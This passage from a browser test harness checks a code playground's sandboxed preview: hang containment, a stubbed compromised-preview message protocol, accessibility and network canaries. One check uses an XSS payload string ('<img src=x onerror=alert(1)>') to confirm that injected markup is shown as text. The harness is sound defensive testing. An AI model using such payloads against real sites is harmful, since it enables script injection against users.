  check("no uncaught errors in the parent document", final.errors.length === 0, final.errors);
  await page.screenshot({ path: `${OUT}/screenshots/after-security-1440-dark.png` });
  await context.close();
}

async function suiteResources(browser) {
  const { context, page } = await newPage(browser);
  await openChallenge(page);
  const results = {};
  // Measure first whether a finite uninstrumented block (~1-2 s) freezes the parent. If it does, the preview shares the
  // parent's thread in this engine/mode and an unbounded hang would freeze the tab indefinitely, so those tests are skipped.
  await startMonitor(page);
  // Calibrate the finite Firefox probe below the existing 5s heartbeat limit. On this host
  // repeat(26) can exceed that limit; the runtime correctly stops it before "ready".
  // This does not change the infinite-loop/regex/microtask/allocation cases or any product limit.
  const boundedProgram = ENGINE === "firefox" ? programs.boundedRegex.replace("repeat(26)", "repeat(25)") : programs.boundedRegex;
  const bounded = await run(page, boundedProgram, ["ready"], 60000);
  const boundedGap = await stopMonitor(page);
  results["bounded uninstrumented regex (finite)"] = { repeatCount: ENGINE === "firefox" ? 25 : 26, status: bounded.status, previewReported: await frameLocator(page).locator("#r").textContent(), maxParentTimerGapMs: boundedGap };
  const sharesThread = boundedGap > 500;
  results["preview shares the parent's thread"] = sharesThread;
  const cases = [["infinite render loop", programs.renderLoop, ["stopped"]], ["endless microtask chain", programs.microtaskFlood, ["stopped"]], ["unbounded allocation", programs.memory, ["stopped", "runtime-error"]]];
  if (!sharesThread) cases.push(["uninstrumented regex hang", programs.regexHang, ["stopped"]]);
  else results["uninstrumented regex hang"] = { skipped: `parent froze for ${boundedGap} ms during the finite block, so an unbounded uninstrumented hang would freeze this tab indefinitely` };
  for (const [name, program, statuses] of cases) {
    await startMonitor(page);
    const outcome = await run(page, program, statuses, 30000);
    const gap = await stopMonitor(page);
    results[name] = { status: outcome.status, msToStopped: outcome.ms, maxParentTimerGapMs: gap, frameRemoved: await page.locator('iframe[title="Preview of App.tsx"]').count() === 0, busyRenderersAfterRemoval: await busyRenderers(browser, 1500), problems: (await problems(page)).split("\n").filter(Boolean).slice(1, 2).join("") };
    check(`${name}: contained and the app stays usable`, statuses.includes(outcome.status) && results[name].frameRemoved && await page.locator("[data-lab-run]").isEnabled(), results[name]);
  }
  check("click-handler loop program renders", (await run(page, programs.clickLoop, ["ready"])).status === "ready");
  await startMonitor(page);
  await frameLocator(page).getByRole("button", { name: "Spin" }).click();
  await page.waitForFunction(() => document.querySelector("[data-lab-workspace]")?.getAttribute("data-preview-status") === "stopped", null, { timeout: 15000 });
  results["event-handler infinite loop"] = { status: "stopped", maxParentTimerGapMs: await stopMonitor(page) };
  const large = await run(page, programs.largeOutput, ["ready"], 30000);
  results["large output (50 000 list items)"] = { status: large.status, runToRenderedMs: large.ms, items: await frameLocator(page).locator("#big li").count() };
  check("large output renders", large.status === "ready" && results["large output (50 000 list items)"].items === 50000, results["large output (50 000 list items)"]);

  // Rapid repeated Run
  await setCode(page, solution);
  const before = await runId(page);
  for (let index = 0; index < 20; index++) await page.locator("[data-lab-run]").click({ delay: 0 });
  await waitStatus(page, before + 19, ["ready"], 30000);
  const frames = await page.locator("iframe").count();
  check("20 rapid Run clicks end in one ready preview of the latest run", frames === 1 && await runId(page) === before + 20 && (await frameLocator(page).locator("p").textContent()) === "Count: 0", { frames, runId: await runId(page), expected: before + 20 });
  results["rapid Run x20"] = { frames, finalRunId: await runId(page) };

  // Repeated creation/destruction
  const heap = async () => page.evaluate(() => (performance.memory ? performance.memory.usedJSHeapSize : null));
  const heapBefore = await heap();
  for (let index = 0; index < 15; index++) await run(page, null, ["ready"]);
  results["15 sequential runs"] = { iframes: await page.locator("iframe").count(), parentHeapBefore: heapBefore, parentHeapAfter: await heap() };
  check("15 sequential runs leave one preview frame", results["15 sequential runs"].iframes === 1);

  // Navigate away while the preview is hung (only where the parent stays responsive)
  if (sharesThread) {
    results["navigate away during a hang"] = { skipped: "preview shares the parent's thread in this engine/mode" };
    observe("resource tests", results);
    await context.close();
    return;
  }
  await setCode(page, programs.regexHang);
  const hangRun = await runId(page);
  await page.locator("[data-lab-run]").click();
  await page.waitForFunction((previousRun) => Number(document.querySelector("[data-preview-frame]")?.getAttribute("data-run-id")) > previousRun, hangRun);
  await sleep(1500);
  const leaveStarted = Date.now();
  await page.getByRole("link", { name: "Practice", exact: false }).first().click();
  await page.waitForURL(`${APP}/practice`, { timeout: 15000 });
  results["navigate away during a hang"] = { msToNavigate: Date.now() - leaveStarted, iframesAfter: await page.locator("iframe").count(), busyRenderersAfter: await busyRenderers(browser, 1500) };
  check("navigating away during a hang works and removes the preview", results["navigate away during a hang"].iframesAfter === 0, results["navigate away during a hang"]);
  await page.goBack();
  await waitStatus(page, 0, ["ready"], 30000);
  check("reopening restores inert saved text in a fresh sandbox", (await page.locator(".cm-content").innerText()).includes("repeat(40)") && (await frameLocator(page).locator("p").textContent()) === "Count: 0");
  observe("resource tests", results);
  await context.close();
}

async function suiteProtocol(browser) {
  if (MODE !== "dedicated") return;
  const results = {};
  const { context, page } = await newPage(browser);
  await openChallenge(page);
  for (const scenario of ["valid", "wrong-session", "stale-run", "malformed", "oversized", "markup", "reordered", "double-hello", "flood", "delayed", "incompatible"]) {
    await startHost("stub", scenario);
    const previous = await runId(page);
    const started = Date.now();
    await page.locator("[data-lab-run]").click();
    const wanted = { valid: ["ready"], "wrong-session": ["ready"], "stale-run": ["ready"], malformed: ["ready"], oversized: ["ready"], markup: ["runtime-error"], reordered: ["runtime-error"], "double-hello": ["ready"], flood: ["stopped"], delayed: ["stopped"], incompatible: ["failed"] }[scenario];
    let status = null;
    try { status = await waitStatus(page, previous, wanted, 20000); } catch { status = await workspaceStatus(page); }
    await sleep(scenario === "delayed" ? 2500 : 400);
    const rejected = Number((await page.locator("[data-preview-frame]").getAttribute("data-rejected-messages")) ?? 0);
    results[scenario] = { status, finalStatus: await workspaceStatus(page), ms: Date.now() - started, rejectedMessages: rejected, problems: (await problems(page)).split("\n").filter(Boolean).slice(0, 4).join(" | ") };
  }
  await startHost("real");
  const expect = {
    valid: (r) => r.finalStatus === "ready" && r.rejectedMessages === 0,
    "wrong-session": (r) => r.status === "ready" && r.rejectedMessages === 1,
    "stale-run": (r) => r.status === "ready" && r.rejectedMessages === 2,
    malformed: (r) => r.status === "ready" && r.rejectedMessages === 6,
    oversized: (r) => r.status === "ready" && r.rejectedMessages === 2,
    markup: (r) => r.finalStatus === "runtime-error" && r.problems.includes("<img src=x onerror=alert(1)>"),
    reordered: (r) => r.finalStatus === "runtime-error",
    "double-hello": (r) => r.status === "ready" && r.rejectedMessages === 1,
    flood: (r) => r.finalStatus === "stopped" && r.problems.includes("too many unexpected messages"),
    delayed: (r) => r.finalStatus === "stopped" && r.ms >= 8000 && r.problems.includes("didn't finish rendering"),
    incompatible: (r) => r.finalStatus === "failed" && r.ms < 5000 && r.problems.includes("different version"),
  };
  for (const [scenario, result] of Object.entries(results)) check(`protocol (compromised preview) ${scenario}`, expect[scenario](result), result);
  check("injected markup in diagnostics is rendered as text, not HTML", (await page.locator("[data-lab-problems] img, [data-lab-problems] script, [data-lab-problems] b").count()) === 0);
  observe("protocol scenarios", results);
  const previous = await runId(page);
  await page.locator("[data-lab-run]").click();
  check("real preview works again after the stub scenarios", await waitStatus(page, previous, ["ready"]) === "ready");

  // Host unavailable, then recovery.
  await stopHost();
  const down = await run(page, null, ["failed"], 20000);
  check("preview host down: fails after the hello timeout with a recovery action", down.status === "failed" && (await problems(page)).includes("couldn't start") && down.ms >= 9500, down);
  await startHost("real");
  const recovered = await run(page, null, ["ready"]);
  check("Run again recovers once the host is back", recovered.status === "ready");
  observe("host unavailable", { msToFailure: down.ms, recoveryMs: recovered.ms });
  await context.close();
}

async function suiteAccessibility(browser) {
  // Keyboard on desktop
  {
    const { context, page } = await newPage(browser);
    await openChallenge(page);
    await page.locator("[data-lab-run]").focus();
    await page.keyboard.press("Tab");
    check("Tab: Run → Reset", await page.evaluate(() => document.activeElement?.hasAttribute("data-lab-reset")));
    await page.keyboard.press("Tab");
    check("Tab: Reset → Run Tests", await page.locator('[data-lab-tests]').evaluate((el) => el === document.activeElement));
    await page.keyboard.press("Tab");
    check("Tab: Run Tests → editor", await page.evaluate(() => document.activeElement?.classList.contains("cm-content")));
    check("editor is labelled and described", (await page.locator(".cm-content").getAttribute("aria-label")) === "App.tsx code editor" && Boolean(await page.locator(".cm-content").getAttribute("aria-describedby")));
    await page.keyboard.press("ControlOrMeta+Home");
    const before = await page.locator(".cm-content").innerText();
    await page.keyboard.press("Tab");
    check("Tab indents inside the editor", (await page.locator(".cm-content").innerText()) !== before && await page.evaluate(() => document.activeElement?.classList.contains("cm-content")));
    await page.keyboard.press("Escape");
    await page.keyboard.press("Tab");
    check("Escape then Tab leaves the editor", await page.evaluate(() => !document.activeElement?.closest(".cm-editor")));
    const previous = await runId(page);
    await page.locator(".cm-content").click();
    await page.keyboard.press("ControlOrMeta+Enter");
    check("Ctrl/Cmd+Enter runs", await waitStatus(page, previous, ["ready"]) === "ready");
    check("status is a polite live region", (await page.locator("[data-lab-status]").getAttribute("role")) === "status");
    check("visible focus indicator on Run", await page.locator("[data-lab-run]").evaluate((element) => { element.focus(); const style = getComputedStyle(element); return style.boxShadow !== "none" || style.outlineStyle !== "none"; }));
    check("reduced motion is honoured", await page.evaluate(() => matchMedia("(prefers-reduced-motion: reduce)").matches));
    await context.close();
  }
  // Mobile tabs
  {
    const { context, page } = await newPage(browser, { width: 375, hasTouch: ENGINE !== "firefox" });
    await openChallenge(page);
    const tabs = page.getByRole("tablist", { name: "Workspace views" });
    check("mobile: Code/Preview tabs", await tabs.getByRole("tab").count() === 2);
    await setCode(page, solution.replace("Count: {count}", "Mobile: {count}"));
    await tabs.getByRole("tab", { name: "Code" }).focus();
    await page.keyboard.press("ArrowRight");
    check("mobile: ArrowRight selects Preview", (await tabs.getByRole("tab", { name: "Preview" }).getAttribute("aria-selected")) === "true");
    await page.keyboard.press("Home");
    check("mobile: switching views keeps edits", (await page.locator(".cm-content").innerText()).includes("Mobile: {count}"));
    const previous = await runId(page);
    await page.locator("[data-lab-run]").click();
    await waitStatus(page, previous, ["ready"]);
    check("mobile: Run shows the edited preview", (await tabs.getByRole("tab", { name: "Preview" }).getAttribute("aria-selected")) === "true" && (await frameLocator(page).locator("p").textContent()) === "Mobile: 0");
    await context.close();
  }
  // Responsive matrix
  for (const width of [320, 375, 768, 1024, 1440]) for (const theme of ["dark", "light"]) {
    const { context, page } = await newPage(browser, { width, theme, hasTouch: width < 1024 && ENGINE !== "firefox" });
    const tag = `${width}/${theme}`;
    await openChallenge(page);
    check(`${tag} no horizontal overflow`, await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
    check(`${tag} preview theme matches`, await page.evaluate((value) => document.documentElement.classList.contains(value), theme) && (await frameLocator(page).locator("html").getAttribute("data-theme")) === theme);
    const tablist = await page.getByRole("tablist", { name: "Workspace views" }).count();
    check(`${tag} layout ${width < 1024 ? "tabs" : "two panels"}`, width < 1024 ? tablist === 1 : tablist === 0 && await page.locator('[data-lab-panel="preview"]').isVisible());
    check(`${tag} 44px toolbar targets`, await page.locator("[data-lab-run], [data-lab-reset]").evaluateAll((elements) => elements.every((element) => element.getBoundingClientRect().height >= 44)));
    check(`${tag} no parent errors`, (await page.evaluate(() => window.__parentErrors)).length === 0);
    if (width === 375 || width === 1440) await page.screenshot({ path: `${OUT}/screenshots/challenge-${width}-${theme}.png`, fullPage: width === 1440 });
    await context.close();
  }
}

(async () => {
  fs.mkdirSync(`${OUT}/screenshots`, { recursive: true });
  const canaries = await startCanaries();
  await startHost("real");
  const browser = await pw[ENGINE].launch(LAUNCH);
  report.browserVersion = `${ENGINE} ${browser.version()}`;
  {
    const probe = await browser.newPage();
    testBrowserUA = await probe.evaluate(() => navigator.userAgent);
    await probe.close();
  }
  try {
    for (const [name, suite] of [["isolation-function", suiteIsolationAndFunction], ["protocol", suiteProtocol], ["resources", suiteResources], ["accessibility", suiteAccessibility]]) {
      console.log(`[${ENGINE}/${MODE}] ${name}…`);
      try { await suite(browser); } catch (error) { report.errors.push({ suite: name, error: error.stack }); console.error(error); }
    }
  } finally {
    await browser.close();
    await stopHost();
    // Any sentinel traffic means something outside the tests is probing local ports.
    await sleep(500);
    canaries.close();
    report.finishedAt = new Date().toISOString();
    const harness = report.network.hostServer.filter((record) => record.userAgent === HARNESS_UA).length + report.network.canary.filter((record) => record.userAgent === HARNESS_UA).length;
    const issuedUrls = new Set(report.network.browser.map((record) => record.url.split("#")[0]));
    const requestTarget = (record) => record.url ?? `${record.path}${record.query ?? ""}`;
    const serverRecords = [...report.network.hostServer, ...report.network.canary].filter((record) => record.userAgent !== HARNESS_UA);
    // Requests from the browser under test must match a request it recorded; anything else is an external client.
    const fromTestBrowser = serverRecords.filter((record) => record.userAgent === testBrowserUA);
    const external = serverRecords.filter((record) => record.userAgent !== testBrowserUA);
    const unattributed = fromTestBrowser.filter((record) => ![...issuedUrls].some((url) => url.endsWith(requestTarget(record))));
    report.network.summary = {
      browserRequests: report.network.browser.length,
      hostServerRequests: report.network.hostServer.length,
      canaryRequests: report.network.canary.length,
      stunPackets: report.network.stun.length,
      sentinelRequests: report.network.sentinel.length,
      harnessRequests: harness,
      testBrowserUserAgent: testBrowserUA,
      testBrowserServerRequestsWithoutBrowserRecord: unattributed,
      externalClientRequests: external,
    };
    check("sentinel port received no requests (no external probes during the run)", report.network.sentinel.length === 0, report.network.sentinel);
    check("every server-side request from the test browser matches a request it recorded", unattributed.length === 0, unattributed.slice(0, 10));
    observe("requests from clients other than the test browser (see network-investigation.md)", external);
    fs.writeFileSync(`${OUT}/report.json`, JSON.stringify(report, null, 2) + "\n");
    const failures = report.checks.filter((item) => !item.passed);
    console.log(JSON.stringify({ engine: report.browserVersion, mode: MODE, checks: report.checks.length, failed: failures.length, errors: report.errors.length }));
    if (failures.length || report.errors.length) process.exitCode = 1;
  }
})();
